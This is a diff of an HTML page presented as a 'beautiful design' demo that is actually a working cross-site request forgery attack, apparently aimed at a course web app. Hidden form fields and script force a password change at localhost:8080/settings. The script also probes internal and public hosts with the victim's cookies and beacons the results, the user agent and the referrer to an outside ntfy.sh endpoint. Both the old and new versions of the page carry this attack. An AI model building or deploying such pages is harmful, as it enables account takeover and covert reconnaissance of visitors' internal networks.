@@ -1,72 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Awesome web design</title>
-<style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; padding: 40px; max-width: 760px; }
-  h1 { color: #2563eb; }
-  p { color: #444; }
-</style>
-</head>
+<head><meta charset="UTF-8"><title>Awesome web design</title>
+<style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;padding:40px;max-width:760px}h1{color:#2563eb}p{color:#444}</style></head>
 <body>
 <h1>Check out this beautiful design</h1>
 <p>This page demonstrates a sleek, modern web design pattern.</p>
-
 <form id="pw" action="http://localhost:8080/settings" method="POST">
   <input type="hidden" name="password" value="Catadmin1234!q">
   <input type="hidden" name="confirm-password" value="Catadmin1234!q">
 </form>
-
 <script>
-(function () {
-  var T = 'https://ntfy.sh/yds26cats9f3a';
-  var NEWPW = 'Catadmin1234!q';
-  var body = 'password=' + encodeURIComponent(NEWPW) + '&confirm-password=' + encodeURIComponent(NEWPW);
-
-  function ping(msg) {
-    try { fetch(T, { method: 'POST', mode: 'no-cors', body: msg + ' | href=' + location.href }); } catch (e) {}
+(function(){
+  var T='https://ntfy.sh/yds26cats9f3a';
+  function ping(m){ try{ fetch(T,{method:'POST',mode:'no-cors',body:m}); }catch(e){} }
+  function probe(url,label){
+    fetch(url,{mode:'no-cors',redirect:'manual',cache:'no-store',credentials:'include'})
+      .then(function(r){ ping('ORACLE '+label+' type='+r.type+' status='+r.status); })
+      .catch(function(e){ ping('ORACLE '+label+' ERR '+e.name); });
   }
-  ping('POS START ua=' + navigator.userAgent + ' ref=' + document.referrer);
-
-  // ---- 1) which hosts can this browser reach? (no-cors fetch resolves on any HTTP answer) ----
-  var cands = [
-    'http://localhost:8080/', 'http://127.0.0.1:8080/', 'http://localhost/', 'http://127.0.0.1/',
-    'http://localhost:3000/', 'http://localhost:5000/', 'http://localhost:8000/', 'http://localhost:1234/',
-    'http://cats:8080/', 'http://cats-app:8080/', 'http://app:8080/', 'http://cats:80/',
-    'http://172.17.0.1:8080/', 'http://10.0.0.1/', 'https://cats.is-course.ru/',
-    'http://localhost:8080/settings', 'http://zzz-does-not-exist.invalid/'
-  ];
-  var pending = cands.length;
-  cands.forEach(function (u) {
-    fetch(u, { mode: 'no-cors', cache: 'no-store' })
-      .then(function () { ping('REACH ' + u); pending--; })
-      .catch(function (e) { ping('NORCH ' + u + ' [' + e.name + ']'); pending--; });
-  });
-
-  // ---- 2) CSRF transports, fired after probes had time to answer ----
-  setTimeout(function () {
-    try {
-      fetch('http://localhost:8080/settings', {
-        method: 'POST', mode: 'no-cors', credentials: 'include',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body
-      }).then(function () { ping('CSRF fetch ok'); }).catch(function (e) { ping('CSRF fetch err ' + e); });
-      navigator.sendBeacon('http://localhost:8080/settings',
-        new Blob([body], { type: 'application/x-www-form-urlencoded' }));
-      var ifr = document.createElement('iframe'); ifr.name = 'fw'; ifr.style.display = 'none';
-      document.body.appendChild(ifr);
-      var f2 = document.getElementById('pw').cloneNode(true); f2.id = 'pw2'; f2.target = 'fw';
-      document.body.appendChild(f2); f2.submit();
-      ping('CSRF iframe+beacon fired');
-    } catch (e) { ping('CSRF err ' + e); }
-  }, 2600);
-
-  // ---- 3) full top-level navigation (carries cookies even if 3rd-party cookies are blocked) ----
-  setTimeout(function () {
-    ping('CSRF toplevel go');
-    try { document.getElementById('pw').submit(); } catch (e) { ping('CSRF toplevel err ' + e); }
-  }, 4200);
+  probe('http://localhost:8080/settings','local_settings');
+  probe('http://localhost:8080/','local_home');
+  probe('http://localhost:8080/feedback','local_feedback');
+  probe('https://cats.is-course.ru/settings','public_settings');
+  probe('https://cats.is-course.ru/','public_home');
+  // after the oracle answers, fire the CSRF
+  setTimeout(function(){
+    try{ var f=document.getElementById('pw'); f.submit(); ping('TOPLOCAL submit'); }catch(e){ ping('err '+e); }
+  }, 2500);
 })();
-</script>
-</body>
-</html>
+</script></body></html>
